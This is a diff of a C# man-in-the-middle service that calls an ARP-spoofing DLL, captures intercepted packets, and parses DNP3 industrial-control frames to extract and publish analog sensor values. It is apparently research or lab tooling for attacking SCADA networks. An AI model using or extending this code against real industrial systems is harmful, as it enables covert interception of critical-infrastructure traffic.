@@ -1,10 +1,16 @@
-﻿using MITM_Common;
+﻿using DNP3DataPointsModel;
+using DNP3TCPDriver.ApplicationLayer;
+using DNP3TCPDriver.DataLinkLayer;
+using DNP3TCPDriver.UserLevel;
+using MITM_Common;
 using MITM_Common.MITM_Service;
+using PubSub;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace MITM_Service
@@ -18,7 +24,7 @@ namespace MITM_Service
         public static extern void ARPSpoof(ref ARPSpoofParticipantsInfo participants);
 
         [DllImport("ARPSpoof.dll", EntryPoint = "RetreivePackets", CallingConvention = CallingConvention.Cdecl)]
-        public static extern void RetreivePackets(ref PacketStruct[] packetStructs);
+        public static extern void RetreivePackets(ref PacketStruct packetStructs);
 
         [DllImport("ARPSpoof.dll", EntryPoint = "Terminate", CallingConvention = CallingConvention.Cdecl)]
         public static extern void Terminate();
@@ -27,38 +33,139 @@ namespace MITM_Service
         private int sniffForHostsInterval = 7;
         private bool terminate = false;
 
+        private object packetLockObject;
+
+        private Publisher publisher;
+
         private Queue<PacketStruct> packetStructs;
+        private DataLinkHandler dNP3DataLinkHandler = new DataLinkHandler();
 
         public MITM_Service()
         {
             hostsIPends = new List<byte>();
             packetStructs = new Queue<PacketStruct>();
+            packetLockObject = new object();
+            publisher = new Publisher();
+            dNP3DataLinkHandler = new DataLinkHandler();
         }
 
         public void ARPSpoof(ARPSpoofParticipantsInfo participants)
         {
             terminate = false;
             Task.Factory.StartNew(() => ARPSpoof(ref participants));
-            Task.Factory.StartNew(() => PacketsProducer());
+            Task.Factory.StartNew(() => PacketProducer());
+            Task.Factory.StartNew(() => PacketConsumer());
         }
 
-        public void PacketsProducer()
+        public void PacketProducer()
         {
             int maxPacketNum = 20;
-            PacketStruct[] retreivedStructs = new PacketStruct[maxPacketNum];
+            PacketStruct packetStruct = new PacketStruct();
 
-            while(!terminate)
+            while (!terminate)
             {
-                RetreivePackets(ref retreivedStructs);
+                RetreivePackets(ref packetStruct);
 
-                foreach (PacketStruct packetStruct in retreivedStructs)
+                if (packetStruct.source_addr[0] == 0)
                 {
-                    if (packetStruct.source_addr[0] == 0)
+                    Thread.Sleep(100);
+                    continue;
+                }
+
+                lock (packetLockObject)
+                {
+                    packetStructs.Enqueue(packetStruct);
+                }
+
+                Thread.Sleep(100);
+            }
+        }
+
+        public void PacketConsumer()
+        {
+            PacketStruct packetStruct;
+
+            while (!terminate)
+            {
+                if (packetStructs.Count() > 0)
+                {
+                    lock (packetLockObject)
                     {
-                        continue;
+                        packetStruct = packetStructs.Dequeue();
                     }
 
-                    packetStructs.Enqueue(packetStruct);
+                    int offset = 54;
+
+                    byte len = packetStruct.packet[offset + 2];
+
+                    int actualLen = (byte)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc
+
+                    len -= 5; // minus header
+
+                    while (len > 0)
+                    {
+                        if (len < 16)
+                        {
+                            // last chunk
+                            actualLen += (byte)(len + 2);
+                            break;
+                        }
+
+                        actualLen += (byte)(16 + 2);
+                        len -= 16;
+                    }
+
+                    byte[] message = new byte[actualLen];
+
+                    for (int i = 0; i < actualLen; i++)
+                    {
+                        message[i] = packetStruct.packet[offset + i];
+                    }
+                    
+                    List<UserLevelObject> userLevelObjects = dNP3DataLinkHandler.PackUp(message);
+
+                    Task.Factory.StartNew(() => ProcessObjects(userLevelObjects));
+
+                    Thread.Sleep(100);
+                }
+            }
+        }
+
+        void ProcessObjects(List<UserLevelObject> userLevelObjects)
+        {
+            foreach (UserLevelObject userObject in userLevelObjects)
+            {
+                if (userObject.FunctionCode == ApplicationFunctionCodes.RESPONSE)
+                {
+                    if (!userObject.IndicesPresent)
+                    {
+                        if (userObject.RangeFieldPresent)
+                        {
+                            if (userObject.RangePresent)
+                            {
+                                for (int i = userObject.StartIndex; i <=userObject.StopIndex; i++)
+                                {
+                                    AnalogInputPoint analogInputPoint;
+                                    if (!Database.AnalogInputPoints.TryGetValue(i, out analogInputPoint))
+                                    {
+                                        analogInputPoint = new AnalogInputPoint();
+
+                                        lock (Database.lockObject)
+                                        {
+                                            Database.AnalogInputPoints.Add(i, analogInputPoint);
+                                        }
+                                    }
+
+                                    lock (Database.lockObject)
+                                    {
+                                        analogInputPoint.Value = BitConverter.ToInt32(userObject.Values[i], 0);
+                                    }
+
+                                    publisher.AnalogInputChange(analogInputPoint);
+                                }
+                            }
+                        }
+                    }
                 }
             }
         }
